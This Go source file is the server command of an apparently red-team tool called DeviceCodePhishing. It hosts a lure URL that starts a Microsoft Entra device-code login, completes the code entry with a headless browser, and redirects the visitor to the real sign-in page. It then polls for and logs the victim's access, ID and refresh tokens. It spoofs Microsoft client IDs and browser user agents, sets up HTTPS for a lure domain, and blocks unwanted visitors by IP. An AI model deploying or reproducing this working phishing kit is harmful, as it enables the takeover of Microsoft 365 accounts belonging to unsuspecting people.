package cmd

import (
	"context"
	"fmt"
	"io"
	"log"
	"log/slog"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/denniskniep/DeviceCodePhishing/pkg/blocklist"
	"github.com/denniskniep/DeviceCodePhishing/pkg/constants"
	"github.com/denniskniep/DeviceCodePhishing/pkg/entra"
	"github.com/denniskniep/DeviceCodePhishing/pkg/utils"
	"github.com/spf13/cobra"

	"golang.org/x/crypto/acme/autocert"
)

const EdgeOnWindows string = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
const MsAuthenticationBroker string = "29d9ed98-a469-4536-ade2-f981bc1d605e"
const DefaultTenant string = "common"

type multiHandler struct {
	handlers []slog.Handler
}

func (h *multiHandler) Enabled(ctx context.Context, level slog.Level) bool {
	// Enabled if any of the handlers are enabled
	for _, handler := range h.handlers {
		if handler.Enabled(ctx, level) {
			return true
		}
	}
	return false
}

func (h *multiHandler) Handle(ctx context.Context, record slog.Record) error {
	// Write to all handlers
	for _, handler := range h.handlers {
		if err := handler.Handle(ctx, record.Clone()); err != nil {
			return err
		}
	}
	return nil
}

func (h *multiHandler) WithAttrs(attrs []slog.Attr) slog.Handler {
	// Create a new multiHandler with WithAttrs called on each handler
	newHandlers := make([]slog.Handler, 0, len(h.handlers))
	for _, handler := range h.handlers {
		newHandlers = append(newHandlers, handler.WithAttrs(attrs))
	}
	return &multiHandler{handlers: newHandlers}
}

func (h *multiHandler) WithGroup(name string) slog.Handler {
	// Create a new multiHandler with WithGroup called on each handler
	newHandlers := make([]slog.Handler, 0, len(h.handlers))
	for _, handler := range h.handlers {
		newHandlers = append(newHandlers, handler.WithGroup(name))
	}
	return &multiHandler{handlers: newHandlers}
}

var (
	address         string
	customUserAgent string
	userAgent       string
	clientId        string
	customClientId  string
	tenant          string
	pathPrefix      string
	domain          string
	certFile        string
	keyFile         string
	blocklistFile   string
	logFile         string
)

func init() {
	rootCmd.AddCommand(runCmd)
	runCmd.Flags().StringVarP(&address, "address", "a", ":8080", "Server listening address")
	runCmd.Flags().StringVarP(&userAgent, "user-agent", "u", "", "Predefined User-Agent to use (see --help for list)")
	runCmd.Flags().StringVar(&customUserAgent, "custom-user-agent", EdgeOnWindows, "Custom User-Agent string")
	runCmd.Flags().StringVarP(&clientId, "client-id", "c", "", "ClientId key to use (see --help for predefined options)")
	runCmd.Flags().StringVar(&customClientId, "custom-client-id", "", "Custom ClientId (full GUID)")
	runCmd.Flags().StringVarP(&tenant, "tenant", "t", DefaultTenant, "Azure tenant to target")
	runCmd.Flags().StringVarP(&pathPrefix, "path", "p", "", "Custom path for the lure URL (e.g., /custom) - default is /lure")
	runCmd.Flags().StringVarP(&domain, "domain", "d", "", "Domain name for automatic HTTPS (uses Let's Encrypt)")
	runCmd.Flags().StringVar(&certFile, "cert", "", "Certificate file for HTTPS (also requires --key)")
	runCmd.Flags().StringVar(&keyFile, "key", "", "Key file for HTTPS (also requires --cert)")
	runCmd.Flags().StringVarP(&blocklistFile, "blocklist", "b", "", "Blocklist file containing IP addresses and CIDR ranges to block")
	runCmd.Flags().StringVarP(&logFile, "log-file", "l", "", "File to write logs to (default is stdout only)")
}

var runCmd = &cobra.Command{
	Use:   "server",
	Short: "Starts the phishing server",
	Long: `Starts the phishing server. Listens by default on http://localhost:8080/lure

Available User-Agent options for --user-agent:
  firefox-android        - Firefox on Android
  chrome-android         - Chrome on Android
  edge-android          - Edge on Android
  android-browser       - Default Android browser
  firefox-macos         - Firefox on macOS
  chrome-macos          - Chrome on macOS
  edge-macos            - Edge on macOS
  safari-macos          - Safari on macOS
  chrome-desktop        - Chrome on Windows
  ie11                  - Internet Explorer 11
  firefox-windows       - Firefox on Windows
  edge-legacy           - Legacy Edge on Windows
  edge-ios              - Edge on iOS
  chrome-ios            - Chrome on iOS
  safari-ios            - Safari on iOS
  firefox-ios           - Firefox on iOS
  firefox-linux         - Firefox on Linux
  chrome-linux          - Chrome on Linux
  edge-linux            - Edge on Linux
  brave-linux           - Brave on Linux
  vivaldi-linux         - Vivaldi on Linux
  opera-linux           - Opera on Linux
  chromium-linux        - Chromium on Linux
  konqueror-linux       - Konqueror on Linux
  firefox-os2           - Firefox on OS/2
  seamonkey-os2         - SeaMonkey on OS/2
  chromplus-os2         - ChromePlus on OS/2
  qt-browser-os2        - Qt Browser on OS/2
  netfront-os2          - NetFront on OS/2

Available ClientId options for --client-id:
  msauthbroker          - Microsoft Authentication Broker (default)
  office365             - Office 365 Management
  azurecli              - Microsoft Azure CLI
  officeuwa             - Office UWP PWA
  msdocs                - Microsoft Docs
  azurepowershell       - Microsoft Azure PowerShell
  windowsspotlight      - Windows Spotlight
  aadpowershell         - Azure Active Directory PowerShell
  msteams               - Microsoft Teams
  mstodo                - Microsoft To-Do client
  universalstore        - Universal Store Native Client
  winsearch             - Windows Search
  outlook               - Outlook Mobile
  bingsearch            - Microsoft Bing Search for Microsoft Edge
  authenticator         - Microsoft Authenticator App
  powerapps             - PowerApps
  whiteboard            - Microsoft Whiteboard Client
  flow                  - Microsoft Flow Mobile
  roamingbackup         - Enterprise Roaming and Backup
  planner               - Microsoft Planner
  stream                - Microsoft Stream Mobile Native
  visualstudio          - Visual Studio - Legacy
  teamsadmin            - Microsoft Teams - Device Admin Agent
  aadrmpowershell       - Aadrm Admin PowerShell
  intune                - Microsoft Intune Company Portal
  sporemote             - Microsoft SharePoint Online Management Shell
  exchangepowershell    - Microsoft Exchange Online Remote PowerShell
  accountcontrol        - Accounts Control UI
  yammerphone           - Yammer iPhone
  onedrive              - OneDrive Sync Engine
  onedriveios           - OneDrive iOS App
  ondriveconsumer       - OneDrive (Consumer)
  aadjcsp               - AADJ CSP
  powerbi               - Microsoft Power BI
  spoextension          - SharePoint Online Client Extensibility
  aadconnect            - Microsoft Azure AD Connect
  bing                  - Microsoft Bing Search
  sharepoint            - SharePoint
  office                - Microsoft Office
  outlooklite           - Outlook Lite
  modernedge            - Microsoft Edge (Modern)
  tunnel                - Microsoft Tunnel
  edgemobile            - Microsoft Edge (Mobile)
  spandroid             - SharePoint Android
  dynamics365           - Media Recording for Dynamics 365 Sales
  edgewebview           - Microsoft Edge (WebView)
  exchangerest          - Microsoft Exchange REST API Based PowerShell
  intuneagent           - Microsoft Intune Windows Agent

Examples:
  # Using predefined options
  DeviceCodePhishing server --user-agent chrome-android --client-id msteams
  
  # Using custom ClientId  
  DeviceCodePhishing server --custom-client-id "your-custom-clientid-guid"
  
  # With custom path (URL will be /auth)
  DeviceCodePhishing server --path /auth --client-id azurecli
  
  # With blocklist
  DeviceCodePhishing server --blocklist blocklist.txt --client-id office365
  
  # With automatic HTTPS (Let's Encrypt) - allows domain and all subdomains
  DeviceCodePhishing server --domain example.com --client-id office365
  # This will accept: example.com, login.example.com, api.example.com, etc.
  
  # With custom SSL certificates
  DeviceCodePhishing server --cert cert.pem --key key.pem --client-id msteams
  
  # Full example with blocklist
  DeviceCodePhishing server --blocklist blocklist.txt --domain example.com --cert cert.pem --key key.pem

  # With log file
  DeviceCodePhishing server --log-file dcp_web.log --client-id msteams

  # Full example with blocklist and logging
  DeviceCodePhishing server --blocklist blocklist.txt --log-file dcp_web.log --domain example.com

Blocklist Format:
  The blocklist file should contain one IP address or CIDR range per line.
  Empty lines and lines starting with # are ignored.
  Examples:
    192.168.1.0/24
    10.0.0.1
    172.16.5.0/24
    # This is a comment
    8.8.8.8
    2001:db8::/32

Note: Cannot specify both --client-id and --custom-client-id simultaneously
Note: When using --domain, the domain must be properly configured to point to this server's IP
Note: With --domain, all subdomains are automatically accepted
Note: Custom certificates (--cert/--key) take precedence over Let's Encrypt if both are specified`,
	Run: func(cmd *cobra.Command, args []string) {

		// Configure logging first
		var logHandlers []slog.Handler
		stdoutHandler := slog.NewTextHandler(os.Stdout, nil)
		logHandlers = append(logHandlers, stdoutHandler)

		// If log file is specified, add file handler
		if logFile != "" {
			file, err := os.OpenFile(logFile, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
			if err != nil {
				slog.Error("Failed to open log file", "file", logFile, "error", err)
				os.Exit(1)
			}

			fileHandler := slog.NewTextHandler(file, nil)
			logHandlers = append(logHandlers, fileHandler)

			// Create a custom handler that writes to both stdout and file
			logger := slog.New(&multiHandler{handlers: logHandlers})
			slog.SetDefault(logger)

			slog.Info("Logging to file enabled", "file", logFile)
		}

		// Set log level based on verbose flag
		if verbose {
			slog.SetLogLoggerLevel(slog.LevelDebug)
		}

		// Determine which user agent to use
		finalUserAgent := customUserAgent
		if userAgent != "" {
			if ua, ok := constants.PredefinedUserAgents[userAgent]; ok {
				finalUserAgent = ua
			} else {
				slog.Error("Invalid user-agent", "provided", userAgent, "available", strings.Join(getAvailableUserAgents(), ", "))
				os.Exit(1)
			}
		}

		// Determine which ClientId to use
		finalClientId := ""

		// Check if both client-id and custom-client-id are provided
		if clientId != "" && customClientId != "" {
			slog.Error("Cannot specify both --client-id and --custom-client-id",
				"clientId", clientId,
				"customClientId", customClientId)
			os.Exit(1)
		}

		// Use predefined ClientId
		if clientId != "" {
			if cid, ok := constants.PredefinedClientIds[clientId]; ok {
				finalClientId = cid
			} else {
				slog.Error("Invalid client-id", "provided", clientId, "available", strings.Join(getAvailableClientIds(), ", "))
				os.Exit(1)
			}
		}

		// Use custom ClientId
		if customClientId != "" {
			finalClientId = customClientId
		}

		// If no ClientId specified, use default
		if finalClientId == "" {
			finalClientId = MsAuthenticationBroker
		}

		// Sanitize path prefix
		if pathPrefix != "" {
			if !strings.HasPrefix(pathPrefix, "/") {
				pathPrefix = "/" + pathPrefix
			}
			pathPrefix = strings.TrimSuffix(pathPrefix, "/")
		}

		// Set up a single resource handler
		lurePath := pathPrefix
		if lurePath == "" {
			lurePath = "/lure"
		}
		http.HandleFunc(lurePath, getLureHandler(finalClientId, finalUserAgent))

		host, port, err := net.SplitHostPort(address)
		if err != nil || port == "" {
			slog.Error("Invalid address format", "address", address, "error", err)
			os.Exit(1)
		}

		// Create a Server instance to listen on port
		server := &http.Server{
			Addr: address,
		}

		// Initialize blocklist if provided
		var blocklistMiddleware func(http.Handler) http.Handler
		if blocklistFile != "" {
			// Load blocklist
			bl, err := blocklist.New(blocklistFile)
			if err != nil {
				slog.Error("Failed to load blocklist", "file", blocklistFile, "error", err)
				os.Exit(1)
			}

			// Create middleware
			blocklistMiddleware = blocklist.Middleware(bl)
			slog.Info("Blocklist enabled", "file", blocklistFile)
		}

		// Wrap the default ServeMux with middleware
		var handler http.Handler = http.DefaultServeMux
		if blocklistMiddleware != nil {
			handler = blocklistMiddleware(http.DefaultServeMux)
		}
		server.Handler = handler

		// Validate certificate files if provided
		useCustomCerts := false
		if certFile != "" || keyFile != "" {
			if certFile == "" || keyFile == "" {
				slog.Error("Both --cert and --key must be provided for custom certificates")
				os.Exit(1)
			}

			// Check if cert file exists
			if _, err := os.Stat(certFile); os.IsNotExist(err) {
				slog.Error("Certificate file does not exist", "file", certFile)
				os.Exit(1)
			}

			// Check if key file exists
			if _, err := os.Stat(keyFile); os.IsNotExist(err) {
				slog.Error("Key file does not exist", "file", keyFile)
				os.Exit(1)
			}

			useCustomCerts = true
		}

		// Configure SSL/TLS if requested
		isHTTPS := false
		protocol := "http"
		useAutoSSL := false

		// Check if we're using both Let's Encrypt and custom certs (not allowed)
		if domain != "" && useCustomCerts {
			// Custom certificates take precedence
			slog.Warn("Using custom certificates, ignoring Let's Encrypt for domain")
		}

		// Determine if we're using Let's Encrypt
		if domain != "" && !useCustomCerts {
			useAutoSSL = true
		}

		if useCustomCerts || useAutoSSL {
			isHTTPS = true
			protocol = "https"

			// If using Let's Encrypt, typically run on port 443
			if useAutoSSL && address == ":8080" {
				address = ":443"
				server.Addr = address
				// Re-parse the address
				host, port, err = net.SplitHostPort(address)
				if err != nil || port == "" {
					slog.Error("Invalid address format", "address", address, "error", err)
					os.Exit(1)
				}
			}
		}

		slog.Info("Start Server",
			"tenant", tenant,
			"clientId", finalClientId,
			"userAgent", finalUserAgent)

		if host == "" {
			host = "localhost"
		}

		slog.Info("Lure available at", "url", protocol+"://"+host+":"+port+lurePath)

		// Attempt to get public IP
		publicIP := getPublicIP()
		if publicIP != "" {
			// Use domain name if provided, otherwise use public IP
			if domain != "" {
				slog.Info("Public URL", "url", protocol+"://"+domain+":"+port+lurePath)
			} else {
				slog.Info("Public URL", "url", protocol+"://"+publicIP+":"+port+lurePath)
			}
		}

		if useAutoSSL {
			slog.Info("Using automatic HTTPS with Let's Encrypt", "domain", domain)
		} else if useCustomCerts {
			slog.Info("Using custom SSL certificates", "cert", certFile, "key", keyFile, "domain", domain)
		}

		// Start the server
		if isHTTPS {
			if useAutoSSL {
				// Use Let's Encrypt for automatic HTTPS
				certManager := autocert.Manager{
					Prompt:     autocert.AcceptTOS,
					HostPolicy: allowSubdomains(domain),
					Cache:      autocert.DirCache("certs"),
					Email:      "", // Optional: add email for notifications
				}
				server.TLSConfig = certManager.TLSConfig()

				// Add /.well-known/acme-challenge handler for HTTP-01 challenge
				httpServer := &http.Server{
					Addr:    ":80",
					Handler: certManager.HTTPHandler(nil),
				}
				go func() {
					err := httpServer.ListenAndServe()
					if err != nil && err != http.ErrServerClosed {
						slog.Error("Failed to start HTTP server for ACME challenges", "error", err)
					}
				}()

				log.Fatal(server.ListenAndServeTLS("", ""))
			} else {
				// Use custom certificates
				log.Fatal(server.ListenAndServeTLS(certFile, keyFile))
			}
		} else {
			// HTTP only
			log.Fatal(server.ListenAndServe())
		}
	},
}

func getLureHandler(clientId string, userAgent string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		realClientIP := blocklist.GetClientIP(r)

		slog.Info("Lure opened",
			"clientId", clientId,
			"remoteAddr", r.RemoteAddr,
			"realIP", realClientIP,
			"visitor-user-agent", r.UserAgent())

		http.DefaultClient.Transport = utils.SetUserAgent(http.DefaultClient.Transport, userAgent)

		scopes := []string{"openid", "profile", "offline_access"}
		deviceAuth, err := entra.RequestDeviceAuth(tenant, clientId, scopes)
		if err != nil {
			slog.Error("Error starting device code flow", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		redirectUri, err := entra.EnterDeviceCodeWithHeadlessBrowser(deviceAuth, userAgent)
		if err != nil {
			slog.Error("Error during headless browser automation", "error", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}
		go startPollForToken(tenant, clientId, deviceAuth, realClientIP, r.UserAgent())
		http.Redirect(w, r, redirectUri, http.StatusFound)
	}
}

func startPollForToken(tenant string, clientId string, deviceAuth *entra.DeviceAuth, clientIP string, visitorUserAgent string) {
	pollInterval := time.Duration(deviceAuth.Interval) * time.Second

	for {
		time.Sleep(pollInterval)
		slog.Info("Checking for token", "userCode", deviceAuth.UserCode, "clientId", clientId)
		result, err := entra.RequestToken(tenant, clientId, deviceAuth)

		if err != nil {
			slog.Error("Error requesting token", "error", err)
			return
		}

		if result != nil {
			slog.Info("Token received",
				"userCode", deviceAuth.UserCode,
				"clientId", clientId,
				"clientIP", clientIP,
				"visitor-user-agent", visitorUserAgent)
			slog.Info("ACCESS TOKEN:", "token", result.AccessToken)
			slog.Info("ID TOKEN:", "token", result.IdToken)
			slog.Info("REFRESH TOKEN:", "token", result.RefreshToken)
			return
		}
	}
}

func getAvailableUserAgents() []string {
	agents := make([]string, 0, len(constants.PredefinedUserAgents))
	for key := range constants.PredefinedUserAgents {
		agents = append(agents, key)
	}
	return agents
}

func getAvailableClientIds() []string {
	clients := make([]string, 0, len(constants.PredefinedClientIds))
	for key := range constants.PredefinedClientIds {
		clients = append(clients, key)
	}
	return clients
}

// allowSubdomains returns a HostPolicy that accepts the main domain and all its subdomains
func allowSubdomains(domain string) autocert.HostPolicy {
	return func(_ context.Context, host string) error {
		// Allow exact match
		if host == domain {
			return nil
		}

		// Allow subdomains
		if strings.HasSuffix(host, "."+domain) {
			return nil
		}

		return fmt.Errorf("host %q not configured in domain whitelist", host)
	}
}

func getPublicIP() string {
	// Try multiple services to get the public IP
	services := []string{
		"https://api.ipify.org",
		"https://checkip.amazonaws.com",
		"https://icanhazip.com",
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for _, service := range services {
		resp, err := client.Get(service)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		body, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}

		ip := strings.TrimSpace(string(body))
		if ip != "" {
			return ip
		}
	}

	return ""
}
